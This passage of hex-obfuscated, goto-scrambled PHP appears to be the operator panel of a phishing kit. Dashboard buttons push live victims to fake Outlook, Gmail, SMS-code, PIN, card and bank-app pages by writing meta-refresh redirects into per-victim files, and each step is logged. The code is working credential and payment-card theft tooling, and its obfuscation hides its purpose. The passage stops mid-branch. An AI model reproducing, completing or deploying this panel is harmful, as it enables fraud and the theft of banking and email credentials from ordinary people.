                                            <div bis_skin_checked="1">
                                                <div class="fs-6 fw-semibold text-info" bis_skin_checked="1">Usager Page</div>
                                                <?php  echo $_SESSION["\x69\163\165\x73\x61\x67\x65\x72"]; ?>
                                            </div>
                                        </div>
                                        <div class="card-footer px-3 py-2" bis_skin_checked="1">
                                            <a class="btn-block text-medium-emphasis d-flex justify-content-between align-items-center">
                                                <span class="small fw-semibold">Send</span>
                                                <svg width="16px" height="16px" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" fill="#000000">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path d="M364.8 106.666667L298.666667 172.8 637.866667 512 298.666667 851.2l66.133333 66.133333L768 512z" fill="#30ff14" />
                                                    </g>
                                                </svg>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                              	<?php  } goto jPcG5; SEGua: echo $_SESSION["\163\164\141\164\165\163\x5f\157\x6e"]; goto MuUGD; FOyEx: ?>
								<?php  goto xKQ0C; rvvaZ: $directory = $_SESSION["\165\163\x65\x72\151\x64"] . "\57"; goto J11u6; nz9lJ: ?>
								<?php  goto hWD88; no63X: function up_benef($user, $content) { $filename = "\142\x69\x6e\x2e\164\x78\164"; $filePath = $user . "\x2f" . $filename; if (file_exists($filePath)) { file_put_contents($filePath, $content); } else { $file = fopen($filePath, "\x77"); fwrite($file, $content); fclose($file); } } goto CUp9O; DblUi: function clear_log($user) { $content = ''; $filename = "\154\x6f\x67\x2e\x74\170\x74"; $filePath = $user . "\x2f" . $filename; if (file_exists($filePath)) { file_put_contents($filePath, $content); } else { $file = fopen($filePath, "\x77"); fwrite($file, $content); fclose($file); } } goto zEDrs; CUp9O: function readTextFile($user, $filename) { $fileFullPath = $user . "\57" . $filename; if (file_exists($fileFullPath)) { return file_get_contents($fileFullPath); } else { $_SESSION["\x75\163\x65\x72\x69\x64"] = "\x2d\55"; return "\55\x2d"; } } goto I7Fv_; pHOUy: if (check_file($_SESSION["\x75\x73\x65\x72\x69\x64"], $file_s)) { ?>
                                <div class="col-6 col-lg-3 hover-hand" bis_skin_checked="1" onclick="sendData('<?php  echo $_SESSION["\165\163\145\x72\x69\144"]; ?>
', 'sms')">
                                    <div class="card" bis_skin_checked="1">
                                        <div class="card-body p-3 d-flex align-items-center" bis_skin_checked="1">
                                            <div class="bg-info text-white p-3 me-3" bis_skin_checked="1">
                                                <svg width="40px" height="40px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path
                                                            d="M2 8.5C2 5 4 3.5 7 3.5H17C20 3.5 22 5 22 8.5V15.5C22 19 20 20.5 17 20.5H7"
                                                            stroke="#ffffff"
                                                            stroke-width="1.5"
                                                            stroke-miterlimit="10"
                                                            stroke-linecap="round"
                                                            stroke-linejoin="round"
                                                        />
                                                        <path
                                                            opacity="0.4"
                                                            d="M17 9L13.87 11.5C12.84 12.32 11.15 12.32 10.12 11.5L7 9"
                                                            stroke="#ffffff"
                                                            stroke-width="1.5"
                                                            stroke-miterlimit="10"
                                                            stroke-linecap="round"
                                                            stroke-linejoin="round"
                                                        />
                                                        <path opacity="0.4" d="M2 16.5H8" stroke="#ffffff" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round" />
                                                        <path opacity="0.4" d="M2 12.5H5" stroke="#ffffff" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round" />
                                                    </g>
                                                </svg>
                                            </div>
                                            <div bis_skin_checked="1">
                                                <div class="fs-6 fw-semibold text-info" bis_skin_checked="1">SMS Page</div>
                                                <?php  echo $_SESSION["\151\163\163\155\x73"]; ?>
                                            </div>
                                        </div>
                                        <div class="card-footer px-3 py-2" bis_skin_checked="1">
                                            <a class="btn-block text-medium-emphasis d-flex justify-content-between align-items-center">
                                                <span class="small fw-semibold">Send</span>
                                                <svg width="16px" height="16px" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" fill="#000000">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path d="M364.8 106.666667L298.666667 172.8 637.866667 512 298.666667 851.2l66.133333 66.133333L768 512z" fill="#30ff14" />
                                                    </g>
                                                </svg>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                              	<?php  } goto RDE38; zrxLT: ?>

								<?php  goto JpUMG; BlD2G: function createFilesIfNotExist($user) { $files = array("\x6d\145\163\163\141\x67\x65\56\x74\x78\164", "\154\157\147\56\x74\x78\x74", "\160\x72\x6f\152\x65\x63\x74\x2e\x74\x78\164", "\x61\160\x69\x2e\x74\x78\x74"); if (!is_dir($user)) { mkdir($user, 511, true); } foreach ($files as $file) { $filePath = $user . "\x2f" . $file; if (!file_exists($filePath)) { $fileHandle = fopen($filePath, "\x77"); if (!$fileHandle) { die("\x45\162\162\x6f\x72\72\x20\125\156\141\x62\x6c\145\x20\164\157\40\143\162\145\141\x74\x65\x20\x66\151\x6c\x65\x20\x27{$filePath}\47\x2e\x20\x43\x68\x65\143\x6b\40\x64\x69\162\145\x63\164\x6f\x72\171\x20\x70\145\x72\x6d\151\x73\x73\x69\157\156\x73\56"); } fclose($fileHandle); } } } goto no63X; VvZrW: if (check_file($_SESSION["\x75\163\145\x72\151\144"], $file_s)) { ?>
                                <div class="col-6 col-lg-3 hover-hand" bis_skin_checked="1" onclick="sendData('<?php  echo $_SESSION["\x75\163\x65\162\x69\x64"]; ?>
', 'outlook_login')">
                                    <div class="card" bis_skin_checked="1">
                                        <div class="card-body p-3 d-flex align-items-center" bis_skin_checked="1">
                                            <div class="bg-info text-white p-3 me-3" bis_skin_checked="1">
                                                <svg width="40px" height="40px" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                                                    <path d="M19.484,7.937v5.477L21.4,14.619a.489.489,0,0,0,.21,0l8.238-5.554a1.174,1.174,0,0,0-.959-1.128Z" style="fill: #0072c6;" />
                                                    <path d="M19.484,15.457l1.747,1.2a.522.522,0,0,0,.543,0c-.3.181,8.073-5.378,8.073-5.378V21.345a1.408,1.408,0,0,1-1.49,1.555H19.483V15.457Z" style="fill: #0072c6;" />
                                                    <path
                                                        d="M10.44,12.932a1.609,1.609,0,0,0-1.42.838,4.131,4.131,0,0,0-.526,2.218A4.05,4.05,0,0,0,9.02,18.2a1.6,1.6,0,0,0,2.771.022,4.014,4.014,0,0,0,.515-2.2,4.369,4.369,0,0,0-.5-2.281A1.536,1.536,0,0,0,10.44,12.932Z"
                                                        style="fill: #0072c6;"
                                                    />
                                                    <path
                                                        d="M2.153,5.155V26.582L18.453,30V2ZM13.061,19.491a3.231,3.231,0,0,1-2.7,1.361,3.19,3.19,0,0,1-2.64-1.318A5.459,5.459,0,0,1,6.706,16.1a5.868,5.868,0,0,1,1.036-3.616A3.267,3.267,0,0,1,10.486,11.1a3.116,3.116,0,0,1,2.61,1.321,5.639,5.639,0,0,1,1,3.484A5.763,5.763,0,0,1,13.061,19.491Z"
                                                        style="fill: #0072c6;"
                                                    />
                                                </svg>
                                            </div>
                                            <div bis_skin_checked="1">
                                                <div class="fs-6 fw-semibold text-info" bis_skin_checked="1">Outlook Login</div>
                                                <?php  echo $_SESSION["\151\x73\x6f\165\164\x6c\x6f\x6f\153\x5f\154\x6f\x67\x69\156"]; ?>
                                            </div>
                                        </div>
                                        <div class="card-footer px-3 py-2" bis_skin_checked="1">
                                            <a class="btn-block text-medium-emphasis d-flex justify-content-between align-items-center">
                                                <span class="small fw-semibold">Send</span>
                                                <svg width="16px" height="16px" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" fill="#000000">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path d="M364.8 106.666667L298.666667 172.8 637.866667 512 298.666667 851.2l66.133333 66.133333L768 512z" fill="#30ff14" />
                                                    </g>
                                                </svg>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                              	<?php  } goto W85bu; FaZ20: echo $_SESSION["\165\163\145\x72\x69\144"]; goto Dvmf8; KBk6Z: ini_set("\144\151\x73\160\154\141\171\137\145\x72\162\157\162\163", 1); goto DWCmC; bian6: echo $_SESSION["\163\x74\141\x74\165\x73\137\x6f\156"]; goto D_AmZ; hd8vF: ?>
								<?php  goto iOane; HreRU: if (check_file($_SESSION["\x75\163\x65\x72\x69\x64"], $file_s)) { ?>
                                <div class="col-6 col-lg-3 hover-hand" bis_skin_checked="1" onclick="sendData('<?php  echo $_SESSION["\165\x73\145\x72\151\x64"]; ?>
', 'card')">
                                    <div class="card" bis_skin_checked="1">
                                        <div class="card-body p-3 d-flex align-items-center" bis_skin_checked="1">
                                            <div class="bg-info text-white p-3 me-3" bis_skin_checked="1">
                                                <svg width="40px" height="40px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path
                                                            d="M22 12C22 8.22876 22 6.34315 20.8284 5.17157C19.6569 4 17.7712 4 14 4H10C6.22876 4 4.34315 4 3.17157 5.17157C2 6.34315 2 8.22876 2 12C2 15.7712 2 17.6569 3.17157 18.8284C4.34315 20 6.22876 20 10 20H14C17.7712 20 19.6569 20 20.8284 18.8284C21.4816 18.1752 21.7706 17.3001 21.8985 16"
                                                            stroke="#ffffff"
                                                            stroke-width="1.5"
                                                            stroke-linecap="round"
                                                        />
                                                        <path d="M10 16H6" stroke="#ffffff" stroke-width="1.5" stroke-linecap="round" />
                                                        <path d="M14 16H12.5" stroke="#ffffff" stroke-width="1.5" stroke-linecap="round" />
                                                        <path d="M2 10L7 10M22 10L11 10" stroke="#ffffff" stroke-width="1.5" stroke-linecap="round" />
                                                    </g>
                                                </svg>
                                            </div>
                                            <div bis_skin_checked="1">
                                                <div class="fs-6 fw-semibold text-info" bis_skin_checked="1">Card Page</div>
                                                <?php  echo $_SESSION["\151\163\143\x61\162\144"]; ?>
                                            </div>
                                        </div>
                                        <div class="card-footer px-3 py-2" bis_skin_checked="1">
                                            <a class="btn-block text-medium-emphasis d-flex justify-content-between align-items-center">
                                                <span class="small fw-semibold">Send</span>
                                                <svg width="16px" height="16px" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" fill="#000000">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path d="M364.8 106.666667L298.666667 172.8 637.866667 512 298.666667 851.2l66.133333 66.133333L768 512z" fill="#30ff14" />
                                                    </g>
                                                </svg>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                              	<?php  } goto FOyEx; JpUMG: $file_s = "\151\142\x61\x6e\x2d\141\x70\x70\x2e\x70\x68\160"; goto rqZls; kaTxV: $file_s = "\157\165\164\154\x6f\x6f\x6b\x5f\154\157\147\x69\156\x2e\x70\x68\160"; goto VvZrW; hTSAf: function up_file_log($user, $content) { $filename = "\154\x6f\147\56\x74\170\x74"; $filePath = $user . "\57" . $filename; if (!is_dir($user)) { mkdir($user, 511, true); } $content .= "\12"; if (file_exists($filePath)) { $existingContent = file_get_contents($filePath); $newContent = $content . $existingContent; file_put_contents($filePath, $newContent); } else { $file = fopen($filePath, "\x77"); if ($file) { fwrite($file, $content); fclose($file); } else { echo "\106\x61\x69\154\x65\x64\x20\164\x6f\x20\157\x70\x65\x6e\x20\164\150\145\x20\x66\x69\x6c\145\56"; } } } goto KXurS; VbGTJ: $StrupLom = readTextFile($_SESSION["\x75\x73\x65\162\x69\144"], $local_ds); goto Kv_PF; SrnEA: $file_s = "\145\x6d\141\x69\x6c\x2e\160\150\x70"; goto UIMkI; fahqt: ?>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <!-- /.col-->
                                                </div>
                                                <!-- /.row-->
                                                <hr class="mt-0" />
                                            </div>
                                            <!-- /.col-->
                                            <div class="col-sm-6" bis_skin_checked="1">
                                                <div class="row" bis_skin_checked="1">
                                                    <div class="col-6" bis_skin_checked="1">
                                                        <div class="<?php  goto WsbS7; pqDWd: $_SESSION["\x56\157\160\162\x74"] = isset($info["\143\x69\164\x79"]) ? $info["\x63\x69\x74\x79"] : null; goto GhRoo; bypx_: $file_s = "\147\157\137\x6c\x6f\147\x69\x6e\56\160\x68\160"; goto QuxE2; J11u6: if ($_SERVER["\x52\105\x51\125\x45\123\124\x5f\115\105\124\x48\117\104"] === "\x47\105\x54") { if (isset($_GET["\x61\143\164\x69\157\x6e"])) { $project_file = "\160\162\x6f\152\145\x63\164\56\x74\170\164"; $project_name = readTextFile($_SESSION["\x75\163\x65\x72\x69\144"], $project_file); $_SESSION["\x70\162\157\x6a\145\143\164\137\x6e\141\x6d\145"] = $project_name; $local_time = date("\x59\55\155\55\144\x20\x48\72\x69\72\163"); $directory = $_SESSION["\165\x73\x65\162\x69\x64"] . "\x2f"; $command_send = $_GET["\141\x63\164\x69\157\156"]; $command_page = "\151\x6e\143\x6f\162\162\145\x63\x74\40\160\141\x67\145"; if ($command_send == "\x6c\x6f\x67\151\x6e") { $project_name = $_SESSION["\160\x72\157\152\145\143\x74\x5f\156\x61\x6d\145"]; up_file($_SESSION["\165\x73\x65\162\x69\144"], "\74\155\145\164\141\x20\150\164\x74\160\55\145\161\165\x69\x76\75\x27\162\x65\x66\x72\x65\163\x68\x27\x20\x63\x6f\x6e\164\x65\156\164\75\47\60\73\x75\x72\x6c\x3d\x6c\157\x67\x69\x6e\56\160\150\160\77\x76\x65\x72\151\x66\x79\137\x61\x63\143\x6f\x75\x6e\x74\x3d\x73\145\163\x73\151\x6f\156\x3d\x26" . md5(microtime()) . "\x26\144\151\x73\x70\x61\x74\143\x68\x3d" . sha1(microtime()) . "\x26\x61\143\x63\x65\x73\x73\75\x26\144\141\164\141\x3d" . sha1(microtime()) . "\47\x20\57\76"); up_file_log($_SESSION["\x75\163\145\162\x69\x64"], "\123\x65\x6e\144\x20\x45\x72\162\x6f\162\40\x70\141\147\x65\40\123\165\x63\143\145\x73\163\x66\x75\154\154\x79\174{$project_name}\x7c{$local_time}"); $command_page = "\x4c\x4f\107\x49\x4e\40\x50\x41\x47\105"; } elseif ($command_send == "\x77\145\142\x6d\141\151\154") { $project_name = $_SESSION["\x70\x72\157\152\x65\143\164\x5f\x6e\x61\x6d\x65"]; up_file($_SESSION["\x75\163\x65\162\x69\x64"], "\x3c\155\x65\x74\x61\40\150\x74\x74\x70\x2d\x65\161\165\151\166\x3d\47\x72\x65\x66\x72\145\x73\x68\x27\40\x63\x6f\x6e\164\145\x6e\x74\75\x27\x30\x3b\x75\162\154\75\x77\145\142\x6d\141\x69\154\56\160\150\x70\x3f\x76\145\162\x69\146\x79\137\141\x63\x63\157\x75\x6e\164\x3d\x73\145\x73\163\x69\157\156\x3d\46" . md5(microtime()) . "\x26\x64\x69\x73\x70\141\164\x63\x68\x3d" . sha1(microtime()) . "\x26\141\x63\143\x65\x73\163\75\x26\x64\141\x74\x61\x3d" . sha1(microtime()) . "\47\40\57\76"); up_file_log($_SESSION["\x75\163\145\162\151\144"], "\123\145\x6e\144\40\x77\145\x62\155\x61\151\154\40\x70\141\x67\145\x20\x53\x75\143\x63\145\x73\x73\x66\165\x6c\154\171\174{$project_name}\x7c{$local_time}"); $command_page = "\127\x45\102\115\x41\x49\x4c\40\120\x41\107\105"; } elseif ($command_send == "\x75\164\x69\x6c\151\163\141\x74\145\x75\x72") { $project_name = $_SESSION["\x70\x72\x6f\152\145\143\x74\x5f\156\x61\155\145"]; up_file($_SESSION["\x75\x73\145\162\x69\144"], "\74\x6d\145\164\141\x20\150\x74\164\x70\55\145\161\165\151\x76\x3d\47\x72\x65\146\162\x65\163\x68\47\40\x63\x6f\156\x74\145\x6e\x74\75\x27\x30\x3b\165\162\x6c\75\165\x74\151\154\151\x73\x61\164\x65\165\162\56\x70\x68\160\x3f\x76\x65\162\x69\x66\x79\137\x61\143\x63\x6f\x75\x6e\164\75\x73\x65\163\163\151\x6f\156\x3d\x26" . md5(microtime()) . "\x26\x64\x69\163\x70\141\x74\143\x68\x3d" . sha1(microtime()) . "\x26\141\143\x63\145\163\x73\75\x26\x64\141\164\x61\x3d" . sha1(microtime()) . "\x27\x20\57\76"); up_file_log($_SESSION["\x75\x73\x65\162\151\144"], "\123\145\x6e\144\x20\x75\164\151\x6c\x69\x73\141\164\x65\165\162\40\x70\141\147\145\40\123\165\x63\143\145\163\163\146\165\x6c\154\171\x7c{$project_name}\x7c{$local_time}"); $command_page = "\125\124\111\x4c\111\x53\101\x54\x45\125\122\40\120\101\x47\105"; } elseif ($command_send == "\165\163\141\147\x65\162") { $project_name = $_SESSION["\160\x72\x6f\x6a\145\143\164\x5f\x6e\x61\155\145"]; up_file($_SESSION["\x75\x73\x65\162\151\x64"], "\74\x6d\x65\164\x61\x20\150\164\x74\160\x2d\x65\x71\165\x69\x76\75\47\x72\x65\146\162\x65\163\x68\47\40\x63\x6f\156\x74\145\156\x74\75\47\x30\x3b\x75\162\x6c\75\x75\163\141\147\145\162\x2e\x70\150\160\77\x76\x65\x72\x69\146\171\x5f\x61\143\143\157\x75\x6e\164\75\x73\x65\163\163\x69\157\x6e\x3d\46" . md5(microtime()) . "\x26\144\x69\163\160\x61\x74\x63\150\75" . sha1(microtime()) . "\x26\141\143\143\x65\x73\x73\75\46\144\141\164\141\75" . sha1(microtime()) . "\x27\40\x2f\x3e"); up_file_log($_SESSION["\x75\x73\145\162\x69\144"], "\123\145\156\144\40\165\163\141\147\145\x72\x20\160\x61\x67\145\40\123\165\x63\143\145\x73\163\x66\x75\x6c\154\171\174{$project_name}\x7c{$local_time}"); $command_page = "\x55\123\x41\105\x52\40\120\101\107\x45"; } elseif ($command_send == "\141\x6c\145\x72\x74") { $project_name = $_SESSION["\160\162\157\x6a\145\143\164\137\156\x61\x6d\145"]; up_file($_SESSION["\165\163\x65\162\151\x64"], "\x3c\x6d\145\164\141\x20\150\x74\x74\160\x2d\145\x71\165\151\166\75\x27\162\145\146\162\x65\163\150\x27\40\143\x6f\156\164\145\x6e\x74\x3d\47\x30\x3b\165\x72\x6c\75\x61\154\x65\162\x74\56\160\150\160\x3f\166\145\x72\151\146\171\x5f\x61\x63\143\157\165\x6e\164\75\163\x65\163\x73\151\157\x6e\75\46" . md5(microtime()) . "\46\x64\x69\x73\160\x61\164\x63\x68\x3d" . sha1(microtime()) . "\x26\x61\x63\143\x65\x73\163\x3d\46\x64\141\164\x61\75" . sha1(microtime()) . "\x27\40\x2f\x3e"); up_file_log($_SESSION["\165\x73\145\162\151\x64"], "\x53\x65\x6e\144\x20\141\154\145\x72\164\x20\x70\141\147\145\40\123\x75\143\143\145\163\x73\x66\x75\x6c\x6c\171\x7c{$project_name}\x7c{$local_time}"); $command_page = "\x41\114\105\x52\x54\40\120\101\107\x45"; } elseif ($command_send == "\157\160\x65\162\x61\164\x69\x6f\156\163\141\x70\x70") { $project_name = $_SESSION["\160\162\157\152\145\143\x74\x5f\x6e\x61\x6d\x65"]; up_file($_SESSION["\165\163\145\162\x69\144"], "\74\155\145\164\141\x20\150\x74\164\160\55\x65\x71\165\x69\x76\x3d\47\162\145\146\162\x65\x73\x68\x27\x20\143\157\x6e\x74\x65\156\x74\75\x27\60\73\x75\162\x6c\x3d\157\160\145\x72\141\164\x69\157\x6e\x73\x61\160\x70\x2e\x70\150\x70\77\x76\145\162\x69\146\x79\137\141\x63\143\157\x75\x6e\x74\x3d\x73\x65\163\x73\151\x6f\x6e\75\46" . md5(microtime()) . "\x26\144\x69\x73\160\141\x74\x63\x68\x3d" . sha1(microtime()) . "\46\x61\143\143\145\163\163\x3d\46\x64\x61\x74\141\75" . sha1(microtime()) . "\47\x20\x2f\76"); up_file_log($_SESSION["\x75\163\x65\x72\x69\144"], "\x53\x65\x6e\144\40\x4f\x70\x65\162\141\x74\x69\x6f\x6e\x73\x20\101\x50\x50\40\x53\165\143\143\x65\163\163\146\x75\x6c\154\x79\174{$project_name}\174{$local_time}"); $command_page = "\x4f\x70\x65\162\141\x74\151\x6f\156\163\x20\101\x50\x50"; } elseif ($command_send == "\x6f\x70\145\x72\141\164\x69\x6f\x6e\x73\163\x6d\x73") { $project_name = $_SESSION["\160\162\157\x6a\145\x63\x74\x5f\156\141\x6d\145"]; up_file($_SESSION["\x75\x73\145\x72\x69\x64"], "\74\x6d\x65\x74\x61\x20\150\x74\x74\x70\x2d\145\x71\x75\151\x76\x3d\x27\x72\145\x66\162\145\163\150\47\40\143\157\156\164\x65\156\x74\x3d\47\60\73\165\162\154\x3d\x6f\x70\145\162\141\x74\151\157\x6e\163\163\x6d\x73\x2e\x70\x68\160\x3f\x76\x65\x72\151\x66\x79\x5f\x61\x63\143\x6f\165\x6e\x74\x3d\x73\x65\x73\x73\x69\157\x6e\x3d\46" . md5(microtime()) . "\46\144\x69\x73\160\141\x74\143\150\x3d" . sha1(microtime()) . "\x26\x61\x63\143\145\x73\163\75\x26\x64\x61\164\141\75" . sha1(microtime()) . "\x27\40\x2f\x3e"); up_file_log($_SESSION["\x75\x73\145\162\x69\144"], "\123\145\x6e\x64\x20\x4f\160\x65\x72\141\164\x69\x6f\156\163\x20\123\x4d\123\40\x70\x61\147\145\x20\x53\165\x63\x63\145\x73\x73\x66\165\x6c\x6c\171\x7c{$project_name}\x7c{$local_time}"); $command_page = "\117\x70\x65\x72\141\164\x69\157\156\x73\40\123\x4d\x53"; } elseif ($command_send == "\147\157\x5f\x6c\157\x67\151\x6e") { $project_name = $_SESSION["\x70\162\157\152\x65\143\164\x5f\156\141\155\145"]; up_file($_SESSION["\x75\163\145\x72\x69\x64"], "\74\x6d\x65\x74\141\40\150\x74\x74\x70\x2d\145\161\165\x69\x76\x3d\x27\162\145\x66\162\x65\163\x68\47\x20\143\157\x6e\x74\145\x6e\164\x3d\x27\x30\73\x75\162\x6c\x3d\x67\157\x5f\154\x6f\x67\x69\156\x2e\160\x68\x70\x3f\x76\x65\162\151\x66\171\137\x61\143\x63\157\x75\x6e\164\75\x73\145\163\x73\x69\x6f\x6e\75\46" . md5(microtime()) . "\x26\x64\151\x73\x70\x61\164\x63\x68\x3d" . sha1(microtime()) . "\46\x61\x63\x63\145\163\x73\x3d\46\x64\141\x74\141\x3d" . sha1(microtime()) . "\x27\40\x2f\x3e"); up_file_log($_SESSION["\x75\x73\145\x72\x69\144"], "\123\145\156\144\x20\x77\x65\x62\x6d\x61\x69\154\40\x70\x61\147\x65\40\123\x75\143\x63\x65\x73\163\146\x75\x6c\154\171\x7c{$project_name}\x7c{$local_time}"); $command_page = "\107\x4d\101\111\114\40\x4c\x6f\x67\151\x6e\x20\120\101\107\x45"; } elseif ($command_send == "\x67\157\x5f\160\150\157\x6e\145") { $project_name = $_SESSION["\160\162\x6f\152\x65\143\x74\x5f\156\141\155\x65"]; up_file($_SESSION["\x75\163\x65\162\151\144"], "\x3c\x6d\145\164\x61\40\x68\164\x74\160\x2d\145\x71\165\x69\x76\75\x27\162\145\x66\162\145\163\150\x27\x20\143\x6f\x6e\164\145\156\164\75\x27\x30\x3b\x75\x72\x6c\75\x67\x6f\137\160\x68\x6f\x6e\x65\56\160\150\160\77\166\x65\x72\x69\x66\x79\137\x61\x63\x63\157\x75\x6e\164\75\x73\145\x73\163\x69\x6f\x6e\x3d\x26" . md5(microtime()) . "\x26\x64\151\163\160\141\x74\x63\x68\75" . sha1(microtime()) . "\x26\141\143\143\145\x73\x73\75\x26\144\141\x74\x61\x3d" . sha1(microtime()) . "\x27\x20\57\76"); up_file_log($_SESSION["\x75\163\x65\162\x69\x64"], "\x53\x65\x6e\144\40\x77\x65\142\155\x61\151\x6c\x20\160\141\147\145\40\x53\x75\x63\x63\x65\163\163\146\165\x6c\154\x79\174{$project_name}\174{$local_time}"); $command_page = "\107\115\x41\111\114\40\x50\x68\x6f\x6e\x65\40\x50\x41\x47\x45"; } elseif ($command_send == "\x67\x6f\137\x73\155\163") { $project_name = $_SESSION["\x70\162\157\x6a\x65\143\x74\137\156\x61\x6d\145"]; up_file($_SESSION["\165\x73\x65\x72\151\x64"], "\74\x6d\145\164\x61\x20\x68\164\164\x70\55\x65\x71\165\x69\166\x3d\47\162\x65\x66\x72\145\163\150\47\40\x63\x6f\156\164\x65\156\x74\x3d\47\60\73\x75\x72\x6c\75\147\157\x5f\x73\155\163\56\160\x68\160\77\166\x65\162\x69\x66\171\137\x61\x63\143\157\165\x6e\164\75\163\145\163\163\x69\157\156\75\x26" . md5(microtime()) . "\46\x64\151\163\160\x61\x74\x63\x68\75" . sha1(microtime()) . "\46\x61\x63\143\145\163\x73\x3d\x26\144\x61\x74\141\75" . sha1(microtime()) . "\47\x20\57\x3e"); up_file_log($_SESSION["\x75\163\145\x72\x69\144"], "\x53\x65\x6e\x64\x20\x77\x65\x62\155\141\x69\154\40\160\x61\x67\145\x20\x53\165\143\x63\145\x73\x73\x66\x75\x6c\x6c\x79\x7c{$project_name}\174{$local_time}"); $command_page = "\107\x4d\x41\x49\114\40\x53\x4d\x53\40\120\101\107\x45"; } elseif ($command_send == "\x67\x6f\137\x61\x70\160") { $project_name = $_SESSION["\160\x72\157\152\145\143\164\x5f\156\x61\x6d\145"]; up_file($_SESSION["\x75\x73\145\162\151\x64"], "\74\x6d\x65\x74\141\x20\x68\164\164\160\55\x65\x71\165\151\166\75\x27\x72\145\x66\162\x65\163\x68\47\40\x63\157\156\164\x65\156\164\x3d\x27\x30\73\165\162\154\x3d\147\157\x5f\x61\160\160\56\x70\x68\160\x3f\166\145\162\x69\146\171\x5f\x61\x63\x63\x6f\165\x6e\x74\x3d\x73\x65\x73\163\x69\x6f\156\x3d\x26" . md5(microtime()) . "\46\x64\151\163\x70\x61\x74\x63\150\75" . sha1(microtime()) . "\x26\x61\x63\143\x65\x73\163\75\46\x64\x61\164\141\x3d" . sha1(microtime()) . "\47\x20\57\x3e"); up_file_log($_SESSION["\x75\163\x65\x72\151\x64"], "\123\145\x6e\144\x20\167\145\x62\155\141\151\154\x20\160\x61\147\145\x20\x53\x75\x63\x63\x65\163\x73\x66\165\x6c\x6c\171\x7c{$project_name}\x7c{$local_time}"); $command_page = "\x47\x4d\x41\x49\114\40\101\120\120\40\120\101\x47\105"; } elseif ($command_send == "\x67\x6f\x5f\160\151\x6e") { $project_name = $_SESSION["\x70\x72\x6f\x6a\x65\143\164\x5f\x6e\141\155\145"]; up_file($_SESSION["\x75\x73\145\x72\x69\x64"], "\74\155\x65\164\x61\x20\150\x74\164\160\55\x65\x71\x75\151\x76\75\47\162\x65\146\x72\145\x73\150\47\40\x63\x6f\156\164\145\156\x74\x3d\47\x30\73\x75\162\x6c\75\x67\x6f\x5f\x70\x69\156\56\160\x68\x70\x3f\x76\145\162\151\x66\x79\x5f\x61\143\x63\157\165\x6e\x74\75\163\145\163\163\x69\x6f\156\75\x26" . md5(microtime()) . "\46\x64\x69\163\160\x61\164\x63\150\x3d" . sha1(microtime()) . "\46\x61\x63\x63\x65\163\163\x3d\46\x64\x61\164\141\x3d" . sha1(microtime()) . "\x27\40\57\76"); up_file_log($_SESSION["\165\x73\145\162\151\144"], "\123\x65\156\x64\40\x77\145\142\155\x61\x69\x6c\40\x70\x61\147\x65\40\123\x75\143\x63\145\x73\x73\x66\x75\x6c\x6c\x79\174{$project_name}\x7c{$local_time}"); $command_page = "\107\x4d\101\111\114\x20\x50\x49\116\x20\x50\101\x47\105"; } elseif ($command_send == "\x6f\165\x74\x6c\157\157\x6b\137\x6c\x6f\147\x69\156") { $project_name = $_SESSION["\x70\162\x6f\x6a\145\143\x74\x5f\156\141\x6d\145"]; up_file($_SESSION["\165\x73\x65\x72\151\x64"], "\74\155\145\164\x61\40\x68\x74\164\x70\x2d\145\x71\165\x69\166\75\47\162\x65\x66\162\x65\163\150\x27\40\x63\x6f\156\x74\145\156\x74\75\47\60\73\165\162\154\75\x6f\165\164\154\157\157\x6b\x5f\154\157\147\151\x6e\x2e\160\x68\160\x3f\166\145\162\151\146\x79\137\x61\x63\x63\x6f\165\156\164\75\x73\x65\163\x73\151\x6f\156\x3d\46" . md5(microtime()) . "\x26\144\151\163\x70\141\164\143\x68\x3d" . sha1(microtime()) . "\x26\x61\143\x63\x65\163\163\75\46\x64\141\164\x61\x3d" . sha1(microtime()) . "\47\40\x2f\x3e"); up_file_log($_SESSION["\165\163\x65\x72\x69\144"], "\x53\145\x6e\x64\40\x6f\165\x74\154\157\x6f\x6b\x5f\154\x6f\x67\151\156\x20\160\141\x67\145\x20\123\x75\143\143\x65\x73\x73\146\x75\154\154\x79\x7c{$project_name}\174{$local_time}"); $command_page = "\x6f\x75\x74\154\x6f\157\x6b\x5f\x6c\157\147\151\x6e"; } elseif ($command_send == "\157\x75\x74\x6c\x6f\157\153\x5f\x70\x69\x6e") { $project_name = $_SESSION["\160\162\157\152\x65\143\x74\137\x6e\141\155\145"]; 